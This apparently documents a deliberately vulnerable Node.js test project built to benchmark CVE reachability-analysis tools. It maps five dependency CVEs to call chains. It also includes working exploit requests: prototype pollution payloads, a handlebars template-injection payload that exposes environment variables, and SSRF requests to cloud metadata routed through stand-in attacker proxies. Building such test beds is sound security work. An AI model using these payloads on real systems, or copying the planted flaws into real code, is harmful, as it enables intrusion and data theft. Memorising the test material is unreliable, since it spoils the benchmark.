# Vulnerability Map - Detailed CVE Analysis

This document provides comprehensive mapping of all CVEs in this project, including exact call chains from entry points to vulnerable functions.

## Table of Contents
1. [CVE-2021-23337 - Lodash](#cve-2021-23337)
2. [CVE-2021-44906 - Minimist](#cve-2021-44906)
3. [CVE-2020-7699 - express-fileupload](#cve-2020-7699)
4. [CVE-2021-23369 - Handlebars (Inheritance)](#cve-2021-23369)
5. [CVE-2021-3749 - Axios](#cve-2021-3749)

---

## CVE-2021-23337 - Lodash Prototype Pollution

### Overview
| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2021-23337 |
| **Package** | lodash@4.17.19 |
| **Dependency Type** | Direct |
| **Vulnerability Type** | Prototype Pollution |
| **Severity** | High |
| **CVSS Score** | 7.4 |

### Vulnerable Function
- **Function Name**: `_.defaultsDeep(object, [sources])`
- **Internal Function**: `baseAssignValue()` in lodash internals
- **Package File**: `node_modules/lodash/lodash.js`

### Location in Project
- **Entry Point**: `src/routes/config.js` - POST `/api/config/merge` handler
- **Application Code**: `src/utils/configMerger.js` - `mergeUserConfig()` function
- **Vulnerable Call**: Line where `_.defaultsDeep()` is invoked

### Call Chain
```
[(src/routes/config.js:POST /api/config/merge handler),
 (src/utils/configMerger.js:mergeUserConfig),
 (node_modules/lodash:_.defaultsDeep),
 (node_modules/lodash:baseAssignValue)]
```

### Detailed Call Path
1. **HTTP Request** → POST `/api/config/merge`
2. **Route Handler** → `src/routes/config.js:15-30` - Receives user input
3. **Function Call** → `configMerger.mergeUserConfig(userConfig)` at line 19
4. **Utility Function** → `src/utils/configMerger.js:18` - Calls lodash
5. **Vulnerable Function** → `_.defaultsDeep({}, userConfig, defaultConfig)`
6. **Internal Path** → lodash internally calls `baseAssignValue()` which performs unsafe property assignment

### Exploit Example

**Request:**
```bash
curl -X POST http://localhost:3000/api/config/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "true", "isAdmin": true}}'
```

**Payload:**
```json
{
  "__proto__": {
    "polluted": "true",
    "isAdmin": true
  }
}
```

**Expected Behavior:**
- Object.prototype is polluted
- All new objects inherit the polluted properties
- `checkPollution()` returns `true`
- Response includes `pollutionDetected: true`

**Verification:**
```javascript
const test = {};
console.log(test.polluted); // "true"
console.log(test.isAdmin);  // true
```

---

## CVE-2021-44906 - Minimist Prototype Pollution

### Overview
| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2021-44906 |
| **Package** | minimist@1.2.5 |
| **Dependency Type** | Transitive (via yargs@15.4.1) |
| **Vulnerability Type** | Prototype Pollution |
| **Severity** | Critical |
| **CVSS Score** | 9.8 |

### Dependency Chain
```
project → yargs@15.4.1 → yargs-parser@18.1.3 → minimist@1.2.5
```

### Vulnerable Function
- **Function Name**: `minimist(args, opts)`
- **Package File**: `node_modules/minimist/index.js`
- **Vulnerable Logic**: Argument parsing without prototype pollution protection

### Location in Project
- **Entry Point**: `server.js` - Application startup
- **Application Code**: `server.js:17-29` - yargs configuration
- **Trigger**: Command-line arguments at startup

### Call Chain
```
[(server.js:startup),
 (node_modules/yargs:yargs.parse),
 (node_modules/yargs-parser:parse),
 (node_modules/minimist:minimist)]
```

### Detailed Call Path
1. **Application Start** → `node server.js --__proto__.polluted=true`
2. **Yargs Import** → `server.js:3` - `const yargs = require('yargs')`
3. **Yargs Parse** → `server.js:17-29` - yargs processes arguments
4. **Yargs Parser** → yargs internally calls yargs-parser
5. **Minimist** → yargs-parser uses minimist to parse arguments
6. **Vulnerable Code** → minimist processes `--__proto__.polluted=true` and pollutes Object.prototype

### Exploit Example

**Command:**
```bash
node server.js --__proto__.polluted=true --__proto__.isAdmin=true
```

**Alternative with npm script:**
```bash
npm run start-vuln
```

**Expected Behavior:**
- Object.prototype is polluted during server startup
- Server logs show: "CVE-2021-44906 TRIGGERED"
- All objects created after startup inherit polluted properties
- Health endpoint shows pollution status

**Verification:**
```bash
# Start with pollution
node server.js --__proto__.polluted=true

# Check health endpoint
curl http://localhost:3000/health
# Response: {"status":"running","prototypePollution":"DETECTED","pollutedValue":"true"}
```

---

## CVE-2020-7699 - express-fileupload Prototype Pollution

### Overview
| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2020-7699 |
| **Package** | express-fileupload@1.1.7 |
| **Dependency Type** | Direct |
| **Vulnerability Type** | Prototype Pollution |
| **Severity** | High |
| **CVSS Score** | 7.5 |

### Vulnerable Function
- **Function Name**: `parseNested()`
- **Internal Function**: `utilities.buildFields()`
- **Package File**: `node_modules/express-fileupload/lib/utilities.js`
- **Vulnerable Logic**: Unsafe nested object property creation from form field names

### Location in Project
- **Entry Point**: `src/routes/upload.js` - POST `/api/upload` handler
- **Middleware**: `server.js:40-43` - express-fileupload middleware configuration
- **Application Code**: `src/utils/fileHandler.js` - `handleFileUpload()` function

### Call Chain
```
[(src/routes/upload.js:POST /api/upload handler),
 (express-fileupload middleware:parseNested),
 (node_modules/express-fileupload:utilities.buildFields),
 (src/utils/fileHandler.js:handleFileUpload)]
```

### Detailed Call Path
1. **HTTP Request** → POST `/api/upload` with multipart form data
2. **Express Middleware** → express-fileupload processes request BEFORE route handler
3. **ParseNested** → Middleware calls `parseNested()` to process form field names
4. **BuildFields** → `utilities.buildFields()` creates nested objects from field names like `__proto__[polluted]`
5. **Prototype Pollution** → Unsafe property assignment pollutes Object.prototype
6. **Route Handler** → `src/routes/upload.js:19` - Handler receives already-polluted request
7. **File Handler** → `src/utils/fileHandler.js:16` - Processes the files

### Exploit Example

**Request:**
```bash
curl -X POST http://localhost:3000/api/upload \
  -F "file=@test.txt" \
  -F "__proto__[polluted]=true" \
  -F "__proto__[isAdmin]=true"
```

**Form Data:**
```
file: (binary file data)
__proto__[polluted]: true
__proto__[isAdmin]: true
```

**Expected Behavior:**
- express-fileupload middleware processes form fields
- Field name `__proto__[polluted]` triggers prototype pollution
- Object.prototype is polluted BEFORE route handler executes
- Response includes `pollutionCheck` showing detection

**Verification:**
```javascript
// After upload request
const test = {};
console.log(test.polluted); // "true"
console.log(test.isAdmin);  // "true"
```

**Note:** The vulnerability is triggered by the middleware, so pollution occurs even if the uploaded file is valid.

---

## CVE-2021-23369 - Handlebars Template Injection (Inheritance Pattern)

### Overview
| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2021-23369 |
| **Package** | handlebars@4.7.6 |
| **Dependency Type** | Direct |
| **Vulnerability Type** | Remote Code Execution (Template Injection) |
| **Severity** | High |
| **CVSS Score** | 7.5 |
| **Special Feature** | **Triggered via Class Inheritance** |

### Vulnerable Function
- **Function Name**: `Handlebars.compile(template, options)`
- **Package File**: `node_modules/handlebars/lib/handlebars.js`
- **Vulnerable Logic**: Compiles user-controlled template strings allowing code execution

### Location in Project
- **Entry Point**: `src/routes/render.js` - POST `/api/render/user` handler
- **Child Class**: `src/templates/UserRenderer.js` - `renderUserProfile()` method
- **Parent Class**: `src/templates/BaseRenderer.js` - `compileTemplate()` method (VULNERABLE)
- **Inheritance**: UserRenderer extends BaseRenderer

### Call Chain (Inheritance Path)
```
[(src/routes/render.js:POST /api/render/user handler),
 (src/templates/UserRenderer.js:renderUserProfile),
 (src/templates/BaseRenderer.js:compileTemplate),
 (node_modules/handlebars:Handlebars.compile)]
```

### Detailed Call Path with Inheritance
1. **HTTP Request** → POST `/api/render/user` with template in body
2. **Route Handler** → `src/routes/render.js:19` - Receives user template
3. **Child Class Instantiation** → `const renderer = new UserRenderer()` at line 23
4. **Child Method Call** → `renderer.renderUserProfile(template, userData)` at line 27
   - Method defined in: `src/templates/UserRenderer.js:20`
5. **Parent Method Call** → Child calls `this.render()` which is inherited from BaseRenderer
   - Method defined in: `src/templates/BaseRenderer.js:32`
6. **Vulnerable Method** → `this.render()` calls `this.compileTemplate(templateString)`
   - **VULNERABLE FUNCTION** defined in: `src/templates/BaseRenderer.js:23`
7. **Handlebars Compile** → `this.handlebars.compile(templateString)` at line 26
8. **Code Execution** → Malicious template code is compiled and executed

### Inheritance Hierarchy
```
BaseRenderer (Parent)
├── constructor()
├── compileTemplate()  ← VULNERABLE FUNCTION DEFINED HERE
└── render()           ← Calls compileTemplate()

UserRenderer (Child) extends BaseRenderer
├── constructor()      ← Calls super()
├── renderUserProfile() ← CALLED FROM ROUTE, triggers parent's vulnerable method
└── renderUserCard()   ← Alternative entry point
```

### Class Structure

**Parent Class (BaseRenderer.js):**
```javascript
class BaseRenderer {
  compileTemplate(templateString) {
    // VULNERABLE: Direct compilation of user input
    return this.handlebars.compile(templateString);
  }
  
  render(templateString, data) {
    const template = this.compileTemplate(templateString);
    return template(data);
  }
}
```

**Child Class (UserRenderer.js):**
```javascript
class UserRenderer extends BaseRenderer {
  renderUserProfile(userTemplate, userData) {
    // Calls parent's render() → which calls parent's compileTemplate()
    return this.render(userTemplate, userData);
  }
}
```

### Exploit Examples

**Safe Template:**
```bash
curl -X POST http://localhost:3000/api/render/user \
  -H "Content-Type: application/json" \
  -d '{
    "template": "Hello {{name}}!",
    "userData": {"name": "World"}
  }'
```

**Malicious Template - Environment Variables:**
```bash
curl -X POST http://localhost:3000/api/render/user \
  -H "Content-Type: application/json" \
  -d '{
    "template": "{{constructor.constructor(\"return process.env\")()}}",
    "userData": {}
  }'
```

**Malicious Template - Code Execution:**
```bash
curl -X POST http://localhost:3000/api/render/user \
  -H "Content-Type: application/json" \
  -d '{
    "template": "{{#with \"constructor\"}}{{#with split as |conslist|}}{{this.pop}}{{/with}}{{/with}}",
    "userData": {}
  }'
```

**Expected Behavior:**
- Template is processed through inheritance chain
- Child method → Parent method → Vulnerable function
- Handlebars compiles and executes malicious template
- Can expose environment variables, execute arbitrary code
- Response contains rendered output (may include sensitive data)

### Why This Tests Inheritance

This CVE specifically tests if analysis tools can:
1. ✅ Trace method calls across class inheritance
2. ✅ Identify that `UserRenderer.renderUserProfile()` calls inherited `render()`
3. ✅ Recognize that inherited `render()` calls vulnerable `compileTemplate()`
4. ✅ Map the complete path: Route → Child → Parent → Vulnerable Function

The vulnerability is **defined in the parent** but **triggered through the child**.

---

## CVE-2021-3749 - Axios SSRF via Proxy Configuration

### Overview
| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2021-3749 |
| **Package** | axios@0.21.0 |
| **Dependency Type** | Direct |
| **Vulnerability Type** | SSRF (Server-Side Request Forgery) |
| **Severity** | Medium |
| **CVSS Score** | 5.9 |

### Vulnerable Function
- **Function Name**: `axios.get(url, config)` with user-controlled proxy
- **Internal Function**: `dispatchRequest()` and `proxy-from-env` handling
- **Package File**: `node_modules/axios/lib/core/dispatchRequest.js`
- **Vulnerable Logic**: Improper handling of proxy configuration allows request redirection

### Location in Project
- **Entry Point**: `src/routes/proxy.js` - POST `/api/proxy/fetch` handler
- **Application Code**: `src/utils/proxyClient.js` - `fetchWithProxy()` function
- **Vulnerable Call**: Line where `axios.get()` is called with proxy config

### Call Chain
```
[(src/routes/proxy.js:POST /api/proxy/fetch handler),
 (src/utils/proxyClient.js:fetchWithProxy),
 (node_modules/axios:axios.get),
 (node_modules/axios:dispatchRequest)]
```

### Detailed Call Path
1. **HTTP Request** → POST `/api/proxy/fetch` with URL and proxy config
2. **Route Handler** → `src/routes/proxy.js:19` - Receives user input
3. **Proxy Check** → Handler checks if proxy config is provided (line 28)
4. **Function Call** → `fetchWithProxy(url, proxy)` at line 32
5. **Utility Function** → `src/utils/proxyClient.js:21` - Prepares axios call
6. **Vulnerable Axios Call** → `axios.get(url, {proxy: proxyConfig})` at line 26
7. **Dispatch Request** → axios internally calls `dispatchRequest()`
8. **SSRF Vulnerability** → Request is routed through user-controlled proxy, allowing:
   - Access to internal network resources
   - Request redirection to attacker-controlled servers
   - Bypassing network security controls

### Exploit Examples

**Basic SSRF - Internal Network Access:**
```bash
curl -X POST http://localhost:3000/api/proxy/fetch \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://internal-service:8080/admin",
    "proxy": {
      "host": "attacker-proxy.com",
      "port": 8080
    }
  }'
```

**SSRF - Cloud Metadata Access:**
```bash
curl -X POST http://localhost:3000/api/proxy/fetch \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://169.254.169.254/latest/meta-data/",
    "proxy": {
      "host": "malicious-proxy.example.com",
      "port": 3128
    }
  }'
```

**Alternative Endpoint:**
```bash
curl -X POST http://localhost:3000/api/proxy/fetch-via-user \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://example.com",
    "proxyHost": "attacker-controlled.com",
    "proxyPort": 8080
  }'
```

**Expected Behavior:**
- Axios makes HTTP request through specified proxy
- Attacker controls proxy server and can:
  - Intercept requests and responses
  - Redirect requests to internal resources
  - Access services not directly accessible from client
- Response may contain data from internal services
- CVE identifier included in response

**Attack Scenarios:**
1. **Internal Service Access**: Access internal APIs, databases, admin panels
2. **Cloud Metadata**: Read cloud instance metadata (AWS, GCP, Azure)
3. **Port Scanning**: Probe internal network by varying proxy settings
4. **Request Smuggling**: Manipulate requests to internal services

---

## Summary Table

| CVE ID | Package | Type | Dependency | Vulnerable Function | Entry Point | Special |
|--------|---------|------|------------|-------------------|-------------|---------|
| CVE-2021-23337 | lodash@4.17.19 | Prototype Pollution | Direct | `_.defaultsDeep()` | POST /api/config/merge | - |
| CVE-2021-44906 | minimist@1.2.5 | Prototype Pollution | Transitive | `minimist()` | Command-line args | Via yargs |
| CVE-2020-7699 | express-fileupload@1.1.7 | Prototype Pollution | Direct | `parseNested()` | POST /api/upload | Middleware |
| CVE-2021-23369 | handlebars@4.7.6 | Template Injection | Direct | `Handlebars.compile()` | POST /api/render/user | **Inheritance** |
| CVE-2021-3749 | axios@0.21.0 | SSRF | Direct | `axios.get()` | POST /api/proxy/fetch | Proxy config |

## Complete Call Chains Reference

### Quick Reference Format: [(file:function), ...]

1. **CVE-2021-23337**: `[(routes/config.js:POST), (configMerger.js:mergeUserConfig), (lodash:_.defaultsDeep), (lodash:baseAssignValue)]`

2. **CVE-2021-44906**: `[(server.js:startup), (yargs:parse), (yargs-parser:parse), (minimist:minimist)]`

3. **CVE-2020-7699**: `[(routes/upload.js:POST), (express-fileupload:parseNested), (express-fileupload:utilities.buildFields), (fileHandler.js:handleFileUpload)]`

4. **CVE-2021-23369**: `[(routes/render.js:POST), (UserRenderer.js:renderUserProfile), (BaseRenderer.js:compileTemplate), (handlebars:Handlebars.compile)]` ⚠️ **Inheritance**

5. **CVE-2021-3749**: `[(routes/proxy.js:POST), (proxyClient.js:fetchWithProxy), (axios:axios.get), (axios:dispatchRequest)]`

## Testing Checklist

Use this checklist to verify your CVE reachability analysis tool:

- [ ] Detects CVE-2021-23337 in lodash
- [ ] Traces call chain to `_.defaultsDeep()`
- [ ] Detects CVE-2021-44906 in minimist (transitive)
- [ ] Identifies yargs → minimist dependency chain
- [ ] Detects CVE-2020-7699 in express-fileupload
- [ ] Recognizes middleware-triggered vulnerability
- [ ] Detects CVE-2021-23369 in handlebars
- [ ] **Traces through class inheritance (Parent → Child)**
- [ ] Maps route → child method → parent method → vulnerable function
- [ ] Detects CVE-2021-3749 in axios
- [ ] Identifies SSRF via proxy configuration
- [ ] Generates complete call chains for all CVEs
- [ ] Distinguishes between direct and transitive dependencies

## Notes for Analysis Tools

### Inheritance Pattern Testing
The CVE-2021-23369 (handlebars) vulnerability is specifically designed to test inheritance tracing:
- Vulnerable function is in **BaseRenderer.compileTemplate()**
- Called from **BaseRenderer.render()** 
- Triggered via **UserRenderer.renderUserProfile()**
- UserRenderer **extends** BaseRenderer

Tools should be able to map: **Route → Child Class Method → Inherited Parent Method → Vulnerable Function**

### Transitive Dependency Testing
The CVE-2021-44906 (minimist) tests transitive dependency detection:
- minimist is NOT directly in package.json
- Pulled via: project → yargs → yargs-parser → minimist
- Tool should detect vulnerable package 3 levels deep

### Middleware Testing
The CVE-2020-7699 (express-fileupload) tests middleware vulnerability detection:
- Vulnerability triggers in Express middleware
- Before route handler executes
- Tool should recognize middleware-level vulnerabilities

---

**Document Version**: 1.0  
**Last Updated**: 2026-01-01  
**Project**: Vulnerable Node.js Test Project

